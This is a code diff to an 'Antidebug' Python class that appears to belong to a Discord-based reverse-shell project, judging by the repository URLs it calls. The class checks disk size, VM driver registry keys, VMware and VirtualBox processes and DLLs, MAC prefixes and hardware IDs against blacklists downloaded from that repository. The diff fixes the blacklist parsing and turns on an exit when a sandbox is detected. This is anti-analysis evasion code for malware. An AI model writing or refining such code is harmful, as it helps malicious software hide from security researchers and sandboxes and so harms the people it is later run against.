@@ -23,7 +23,7 @@ class Antidebug:
         min_size = 60
         disks = []
         for i in psutil.disk_partitions(all=False):
-            if os.name == 'nt' and ('cdrom' in i.opts or i.fstype == ''):
+            if os.name == "nt" and ("cdrom" in i.opts or i.fstype == ""):
                 continue
             usage = psutil.disk_usage(i.mountpoint)
             disks.append((i.device, int(usage.total // (2**30))))
@@ -58,8 +58,8 @@ class Antidebug:
 
     def reg_check(self):
         cmd = "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\"
-        reg1 = subprocess.run(cmd + "DriverDesc", shell=True, stderr=subprocess.DEVNULL)
-        reg2 = subprocess.run(cmd + "ProviderName", shell=True, stderr=subprocess.DEVNULL)
+        reg1 = subprocess.run([cmd, "DriverDesc"], shell=True, stderr=subprocess.PIPE)
+        reg2 = subprocess.run([cmd, "ProviderName"], shell=True, stderr=subprocess.PIPE)
         if reg1.returncode == 0 and reg2.returncode == 0:
             return True
 
@@ -67,12 +67,18 @@ class Antidebug:
     def processes_check(self):
         vmware_dll = os.path.join(os.environ["SystemRoot"], "System32\\vmGuestLib.dll")
         virtualbox_dll = os.path.join(os.environ["SystemRoot"], "vboxmrxnp.dll")    
-    
-        process = os.popen('TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="').read()
+
+        #process = subprocess.run('TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="', shell=True, stderr=subprocess.PIPE) #process = subprocess.Popen('TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="', shell=True, stdout=subprocess.PIPE).communicate()[0].decode() #process = os.popen('TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="').read()
+        #processList = []
+        #for processNames in process.split(" "):
+        #    if ".exe" in processNames:
+        #        processList.append(processNames.replace("K\n", "").replace("\n", ""))
+
         processList = []
-        for processNames in process.split(" "):
-            if ".exe" in processNames:
-                processList.append(processNames.replace("K\n", "").replace("\n", ""))
+        for process in psutil.process_iter():
+            process_name = process.name()
+            if process_name != "" and process_name.endswith(".exe"): 
+                processList.append(process_name)
 
         if "VMwareService.exe" in processList or "VMwareTray.exe" in processList:
             return True
@@ -89,13 +95,13 @@ class Antidebug:
         except:
             pass        
         
-        processL = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/process.txt").text
-        if processL in processList:
-            return True
-            
+        processL = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/process.txt").text.replace("\r", "").split("\n")
+        for proc in processL:
+            if proc in processList:
+                return True
             
     def mac_check(self):
-        mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
+        mac_address = ":".join(re.findall("..", "%012x" % uuid.getnode()))
         mac_list = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/mac.txt").text
         if mac_address[:8] in mac_list:
             return True
@@ -113,7 +119,7 @@ class Antidebug:
             
             
     def hwid_check(self):
-        current_machine_id = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()
+        current_machine_id = str(subprocess.check_output("wmic csproduct get uuid"), "utf-8").split("\n")[1].strip()
         hwid_vm = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/hwid.txt").text
         if current_machine_id in hwid_vm:
             return True
@@ -162,7 +168,7 @@ class Antidebug:
                 return True
 
 
-#if Antidebug().main() is not None:
-#    sys.exit(1)
-#else:
-#    sys.exit(1)
+if __name__ == "__main__":
+    import sys
+    if Antidebug().main() is not None:
+        sys.exit(1)
